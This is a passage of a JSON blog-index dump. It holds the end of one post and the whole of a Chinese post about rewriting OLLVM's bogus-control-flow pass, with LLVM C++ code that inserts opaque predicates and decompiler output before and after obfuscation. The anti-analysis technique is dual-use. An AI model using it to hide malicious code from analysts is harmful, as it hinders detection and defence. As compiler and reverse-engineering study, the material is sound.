(_BYTE)x \u0026amp; 1) != 0 )\r;\rgoto LABEL_37;\r}\rprintf(\u0026quot;Pass\u0026quot;);\r}\relse\r{\rprintf(\u0026quot;Average\u0026quot;);\r}\rLABEL_37:\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rLABEL_38:\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\r}\relse\r{\rprintf(\u0026quot;Excellent\u0026quot;);\r}\r}\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rreturn 0;\r}\rrefs OLLVM (好久没更新了啊) https://github.com/obfuscator-llvm//obfuscator/tree/llvm-4.0\nLLVM 官方关于 CMake 构建项目的文档：http://releases.llvm.org/9.0.0/docs/CMake.html#developing-llvm-passes-out-of-source\n一个 LLVM Pass 骨架：https://github.com/sampsyo/llvm-pass-skeleton\n","date":"2020-01-01","permalink":"https://chenx6.github.io/post/build_pass_out_of_tree/","tags":["re","llvm"],"title":"在 LLVM 代码树外编译 LLVM Pass (使用 OLLVM 示范)"},{"content":"由于我个人觉得 OLLVM 的代码年久失修，所以就新建了个项目，开始学习并重写 OLLVM。项目地址：https://github.com/chenx6/baby_obfuscator。如果将我的重写项目和 OLLVM 相比的话，我的项目的优点就是编译比较快（编译整个项目只需要不到 1 分钟），代码比较“新”吧\u0026hellip;\n下面讲讲我个人重写虚假控制流的思路，以及对其他项目中相同功能的理解。\n什么是虚假控制流 (Bogus control flow) 在讲解虚假控制流时，我们先解释一些名词，然后看下流程表示就可以知道大概了。\n名词解释 不透明谓词 (Opaque predicate) 这里引用知乎上大佬的回答：利用不透明谓词混淆代码的原理是什么？ - 张建涛的回答 - 知乎\n不透明谓词是指一个表达式，他的值在执行到某处时，对程序员而言必然是已知的，但是由于某种原因，编译器或者说静态分析器无法推断出这个值，只能在运行时确定。\n中间表示 (IR) 在将代码转换成汇编和机器码之前的一种代码表示形式，可以理解为具有跨平台性和其他特性的汇编。\n虚假控制流的流程表示 用 OLLVM 项目中的注释部分就可以清晰表示出什么是虚假控制流。可以看到，相对于原程序中的单个代码块，混淆后的程序中加入了一个由不透明谓词组成的条件语句，由于混淆器知道他的值，所以可以保证被混淆程序的正确性，而编译器和反编译器都无法对这个表达式进行求值，只能保留此谓词，达到干扰静态分析的目的。\n下面这个图大部分项目都没修正啊\u0026hellip;\nBefore : entry | ______v______ | Original | |_____________| | v return After : entry | ____v_____ |condition*| (false) |__________|----+ (true)| | | | ______v______ | +--\u0026gt;| Original* | | | |_____________| (true) | (false)| !-----------\u0026gt; return | ______v______ | | | Altered |\u0026lt;--! | |_____________| |__________| 怎么实现 别的项目是怎么实现的 在 OLLVM 中，使用了 y \u0026gt; 10 || x * (x + 1) % 2 == 0 这个不透明谓词，学过数学的都知道，x * (x + 1) % 2 == 0 是个永真式。也就是说，混淆器已经知道了 y \u0026gt; 10 || x * (x + 1) % 2 == 0 这个式子的值，所以可以将其放在条件语句中，控制代码的走向；而编译器和反编译器都认为这个表达式需要进行运行后才能求值，会保留这段代码，进而干扰到反编译器。\n在HikariObfuscator这个项目中使用 IRBuilder 生成一箩筐的整数运算，由于 LLVM 的 IRBuilder 会折叠常量，混淆器就能知道了之前生成的一箩筐的整数运算的最终结果，而编译器和反编译器都不知道生成的表达式的值，所以就获得了一个崭新的不透明谓词。\n当然，上面的两个混淆都有较为简单的破解方法，就是将不透明谓词中的变量修改成常量，并且设置一个初始值，这时候 Hex-rays 等反编译器会对不透明谓词进行求值，如果不透明谓词的结果可知，那么这个表达式将会被优化。\n具体实现 这里用的是旧的 LLVM Pass 格式，所以 Pass 的主要逻辑都在 runOnFunction 这个函数中。程序先收集函数中所有的 BasicBlock 和 alloca 指令，然后再随机挑选 BasicBlock 加上虚假控制流。这个 Pass 通过被选中的 BasicBlock 生成虚假的 BasicBlock，然后再使用不透明谓词将这两个 BasicBlock 粘在一起。\nvirtual bool runOnFunction(Function \u0026amp;F) { // Put origin BB into vector. SmallVector\u0026lt;BasicBlock *, 0\u0026gt; targetBasicBlocks; for (BasicBlock \u0026amp;BB : F) { targetBasicBlocks.emplace_back(\u0026amp;BB); } // Put \u0026quot;alloca i32 ...\u0026quot; instruction into allocaInsts for further use findAllocInst(F.getEntryBlock()); // Add bogus control flow to some BB. for (BasicBlock *BB : targetBasicBlocks) { if (rng() % 100 \u0026gt;= ObfProbRate) { continue; } BasicBlock *bogusBB = geneBogusFlow(BB, \u0026amp;F); addBogusFlow(BB, bogusBB, \u0026amp;F); } return true; } 在虚假的 BasicBlock 生成中，先使用 CloneBasicBlock 复制 BasicBlock。\n/// Generate Bogus BasicBlock /// \\param targetBB template BasicBlock /// \\param F function BasicBlock *geneBogusFlow(BasicBlock *targetBB, Function *F) { ValueToValueMapTy VMap; const Twine \u0026amp;Name = \u0026quot;bogusBlock\u0026quot;; BasicBlock *bogusBB = CloneBasicBlock(targetBB, VMap, Name, F); 然后再修复虚假的 BasicBlock，例如修复 phi 节点和编译时生成的 metadata。\n// Remap operands. BasicBlock::iterator ji = targetBB-\u0026gt;begin(); for (Instruction \u0026amp;i : *bogusBB) { // Loop over the operands of the instruction for (Use \u0026amp;opi : i.operands()) { // get the value for the operand Value *v = MapValue(opi, VMap, RF_None); if (v != nullptr) { opi = v; } } // Remap phi nodes' incoming blocks. if (PHINode *pn = dyn_cast\u0026lt;PHINode\u0026gt;(\u0026amp;i)) { for (unsigned int j = 0, e = pn-\u0026gt;getNumIncomingValues(); j != e; ++j) { Value *v = MapValue(pn-\u0026gt;getIncomingBlock(j), VMap, RF_None); if (v != nullptr) { pn-\u0026gt;setIncomingBlock(j, cast\u0026lt;BasicBlock\u0026gt;(v)); } } } // Remap attached metadata. SmallVector\u0026lt;std::pair\u0026lt;unsigned, MDNode *\u0026gt;, 4\u0026gt; MDs; i.getAllMetadata(MDs); // important for compiling with DWARF, using option -g. i.setDebugLoc(ji-\u0026gt;getDebugLoc()); ji++; } 最后是将虚假的 BasicBlock 中的操作数进行随机改变，以干扰静态分析。\n// Modify some instruction's Operands for (Instruction \u0026amp;i : *bogusBB) { if (!i.isBinaryOp()) { continue; } unsigned int opcode = i.getOpcode(); unsigned int numOperands = i.getNumOperands(); if (find(integerOp, opcode) != integerOp.end()) { i.setOperand(0, i.getOperand(rng() % numOperands)); } else if (find(floatOp, opcode) != floatOp.end()) { i.setOperand(0, i.getOperand(rng() % numOperands)); } } return bogusBB; } 接下来是将原本的 BasicBlock 和 虚假的 BasicBlock 用不透明谓词粘在一起。首先挑出本 Basicblock 中第一个不是 Phi、Dbg、Lifetime 的指令的地址，然后调用 splitBasicBlock 函数将一个 Basicblock 按照前面获得的地址一分为二。接下来将两个 BasicBlock 与父节点分离。\n/// Put target BasicBlock and Bogus Block together void addBogusFlow(BasicBlock *targetBB, BasicBlock *bogusBB, Function *F) { // Split the block BasicBlock *targetBodyBB; if (targetBB-\u0026gt;getFirstNonPHIOrDbgOrLifetime()) { targetBodyBB = targetBB-\u0026gt;splitBasicBlock(targetBB-\u0026gt;getFirstNonPHIOrDbgOrLifetime()); } else { targetBodyBB = targetBB-\u0026gt;splitBasicBlock(targetBB-\u0026gt;begin()); } // Modify the terminators to adjust the control flow. bogusBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); targetBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); 最后通过 IRBuilder 创建不透明谓词 (x * (x + 1) % 2 == 0)，将两个 BasicBlock 按照一定的逻辑相连（生成代码的逻辑则是在开头的虚假控制流的流程表示）。这个不透明谓词的变量 x 选择的是之前在 runOnFunction 收集的 alloca 指令，即在高级语言中的各种变量，这样能更强的干扰反编译器（虽然还是可能被符号执行优化掉）。\n// Add opaque predicate // if (x * (x + 1) % 2 == 0) IRBuilder\u0026lt;\u0026gt; bogusCondBuilder(targetBB); Value *loadInst; if (allocaInsts.size() != 0) { loadInst = bogusCondBuilder.CreateLoad(allocaInsts[rng() % allocaInsts.size()]); } else { loadInst = bogusCondBuilder.getInt32(1); } Value *addInst = bogusCondBuilder.CreateAdd(loadInst, bogusCondBuilder.getInt32(1)); Value *mulInst = bogusCondBuilder.CreateMul(loadInst, addInst); Value *remainInst = bogusCondBuilder.CreateSRem(mulInst, bogusCondBuilder.getInt32(2)); Value *trueCond = bogusCondBuilder.CreateICmpEQ(remainInst, bogusCondBuilder.getInt32(0)); bogusCondBuilder.CreateCondBr(trueCond, targetBodyBB, bogusBB); BranchInst::Create(targetBodyBB, bogusBB); // Split at this point (we only want the terminator in the second part) BasicBlock *targetBodyEndBB = targetBodyBB-\u0026gt;splitBasicBlock(--targetBodyBB-\u0026gt;end()); // erase the terminator created when splitting. targetBodyBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); // We add at the end a new always true condition IRBuilder\u0026lt;\u0026gt; endCondBuilder(targetBodyBB, targetBodyBB-\u0026gt;end()); Value *endCond = endCondBuilder.CreateICmpEQ(remainInst, bogusCondBuilder.getInt32(0)); endCondBuilder.CreateCondBr(endCond, targetBodyEndBB, bogusBB); } 基本的代码就是上面所讲的了。相比与 OLLVM，重写的代码中省略了大部分虚假 BasicBlock 中的随机生成代码的部分，并改写了虚假谓词生成的逻辑，在 OLLVM 中，先是先生成了 (1.0 == 1.0) 来进行占位，然后再在后面替换前面的永真式，我个人觉得没必要，直接生成不透明谓词不就好了吗\u0026hellip;所以代码看起来比较精简（在本文撰写时，带注释的代码行数为180行左右）。\n效果演示 原程序反编译结果，和原代码基本一样：\nint __cdecl main(int argc, const char **argv, const char **envp) { int j; // [rsp+10h] [rbp-40h] int i; // [rsp+14h] [rbp-3Ch] unsigned __int64 n; // [rsp+18h] [rbp-38h] char s[32]; // [rsp+20h] [rbp-30h] const char **v8; // [rsp+40h] [rbp-10h] int v9; // [rsp+48h] [rbp-8h] int v10; // [rsp+4Ch] [rbp-4h] v10 = 0; v9 = argc; v8 = argv; __isoc99_scanf(\u0026quot;%30s\u0026quot;, s, envp); n = strlen(s); for ( i = 0; i \u0026lt; n; ++i ) { s[i] ^= 0x2Au; s[i] += 6; } for ( j = 1; j \u0026lt; n; ++j ) s[j - 1] -= s[j]; if ( !strncmp(s, \u0026amp;encrypt_data, n) ) printf(\u0026quot;Correct!\u0026quot;); return 0; } 程序混淆后反编译结果，可以看到混淆器成功的添加了不透明谓词，且程序可以正常运行：\nint __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+20h] [rbp-50h] int v5; // [rsp+30h] [rbp-40h] int v6; // [rsp+30h] [rbp-40h] int v7; // [rsp+34h] [rbp-3Ch] unsigned __int64 n; // [rsp+38h] [rbp-38h] char s[32]; // [rsp+40h] [rbp-30h] const char **v10; // [rsp+60h] [rbp-10h] int v11; // [rsp+68h] [rbp-8h] int v12; // [rsp+6Ch] [rbp-4h] v12 = 0; v11 = argc; v10 = argv; __isoc99_scanf(\u0026quot;%30s\u0026quot;, s, envp); n = strlen(s); v7 = 0; while ( 1 ) { while ( (v5 + 1) * v5 % 2 ) ; if ( v7 \u0026gt;= n ) break; v4 = (v11 + 1) * v11 % 2; if ( v4 ) goto LABEL_20; while ( 1 ) { s[v7] ^= 0x2Au; s[v7] += 6; if ( !v4 ) break; LABEL_20: s[v7] = 0; s[v7] += 6; } if ( (v11 + 1) * v11 % 2 ) goto LABEL_21; while ( 1 ) { ++v7; if ( !((v11 + 1) * v11 % 2) ) break; LABEL_21: v7 = 2; } } do v6 = 1; while ( (v7 + 1) * v7 % 2 ); while ( 2 ) { if ( v6 \u0026lt; n ) { s[v6 - 1] -= s[v6]; if ( !((v11 + 1) * v11 % 2) ) { LABEL_12: ++v6; if ( !((v11 + 1) * v11 % 2) ) continue; } v6 = 2; goto LABEL_12; } break; } if ( !strncmp(s, \u0026amp;encrypt_data, n) ) { if ( !((v6 + 1) * v6 % 2) ) goto LABEL_16; do { printf(\u0026quot;Correct!\u0026quot;); LABEL_16: printf(\u0026quot;Correct!\u0026quot;); } while ( (v6 + 1) * v6 % 2 ); } while ( (v6 + 1) * v6 % 2 ) ; return 0; } refs Obfuscator-llvm源码分析\nHikariObfuscator/Core\nobfuscator-llvm/obfuscator\n","date":"2020-01-01","permalink":"https://chenx6.github.io/post/rewrite_ollvm_bcf/","tags":["re","llvm"],"title":"重写 OLLVM 之虚假控制流"}]